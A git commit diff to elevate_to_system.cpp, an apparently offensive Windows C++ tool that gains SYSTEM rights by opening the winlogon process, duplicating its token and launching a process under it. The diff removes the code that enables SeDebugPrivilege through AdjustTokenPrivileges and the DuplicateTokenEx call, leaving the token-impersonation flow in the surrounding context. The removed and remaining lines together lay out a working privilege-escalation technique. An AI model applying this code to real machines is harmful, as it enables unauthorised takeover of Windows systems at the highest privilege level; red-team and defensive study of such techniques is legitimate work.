deb3c0d230167e6535c3ee1f16269c82bed46415
Huy <63166600+DebugPrivilege@users.noreply.github.com>
2023-03-17 11:35:28 +0100

    Update elevate_to_system.cpp

--- elevate_to_system.cpp
+++ elevate_to_system.cpp
@@ -83,74 +83,6 @@ DWORD getWinlogonProcessId()
 }
 
 
-void enableDebugPrivilege()
-{
-    // Open the current process to retrieve its token
-    LUID luid;
-    HANDLE currentProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, GetCurrentProcessId());
-    if (currentProc == INVALID_HANDLE_VALUE)
-    {
-        DWORD errorCode = GetLastError();
-        char errorMessage[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, nullptr, errorCode, 0, errorMessage, sizeof(errorMessage), nullptr);
-        std::cerr << "Error opening current process: " << errorCode << " - " << errorMessage << std::endl;
-        return;
-    }
-
-    HANDLE TokenHandle(nullptr);
-    BOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_QUERY, &TokenHandle);
-    // Check if the call to OpenProcessToken was successful. If it wasn't, print an error message to the standard error stream.
-    if (!hProcessToken)
-    {
-        // Retrieve the error code using GetLastError and convert it to a human-readable message using FormatMessageA.
-        DWORD errorCode = GetLastError();
-        char errorMessage[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, nullptr, errorCode, 0, errorMessage, sizeof(errorMessage), nullptr);
-
-        // Print the error code and message to the standard error stream.
-        std::cerr << "Error opening process token: " << errorCode << " - " << errorMessage << std::endl;
-
-        // Close the handle to the current process before returning from the function.
-        CloseHandle(currentProc);
-        return;
-    }
-
-    // Lookup the LUID for the SeDebugPrivilege privilege
-    BOOL checkToken = LookupPrivilegeValue(nullptr, L"SeDebugPrivilege", &luid);
-    if (!checkToken)
-    {
-        DWORD errorCode = GetLastError();
-        char errorMessage[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, nullptr, errorCode, 0, errorMessage, sizeof(errorMessage), nullptr);
-        std::cerr << "Error looking up privilege value: " << errorCode << " - " << errorMessage << std::endl;
-        CloseHandle(TokenHandle);
-        CloseHandle(currentProc);
-        return;
-    }
-
-    TOKEN_PRIVILEGES tokenPrivs;
-    // Set the number of privileges in the token to 1
-    tokenPrivs.PrivilegeCount = 1;
-    // Set the LUID of the privilege to the value looked up earlier
-    tokenPrivs.Privileges[0].Luid = luid;
-    // Set SeDebugPrivilege
-    tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-    // Adjust the token privileges to enable the SeDebugPrivilege
-    BOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr);
-    {
-        // Close the handles
-        CloseHandle(TokenHandle);
-        CloseHandle(currentProc);
-        return;
-    }
-
-    // Close the handles
-    CloseHandle(TokenHandle);
-    CloseHandle(currentProc);
-}
-
-
 void CreateImpersonatedProcess(HANDLE NewToken)
 {
     bool impersonatedProcessCreated;
@@ -202,16 +134,6 @@ void GetImpersonationToken(int TargetPID)
         return;
     }
 
-    // Duplicate the process token
-    Duplicate = DuplicateTokenEx(TokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, nullptr, SecurityImpersonation, TokenPrimary, &NewToken);
-    if (!Duplicate)
-    {
-        std::cerr << "Error duplicating token: " << GetLastError() << std::endl;
-        CloseHandle(TokenHandle);
-        CloseHandle(hProcess);
-        return;
-    }
-
     // Create an impersonated process with the duplicated token
     CreateImpersonatedProcess(NewToken);
 }
@@ -259,9 +181,6 @@ int main()
 
     // Find the process ID of the winlogon process
     DWORD winlogonPID = getWinlogonProcessId();
-
-    // Enable the SeDebugPrivilege privilege for the current process
-    enableDebugPrivilege();
 
     // Obtain a duplicate of the winlogon process's token and create an impersonated process using it
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, winlogonPID);
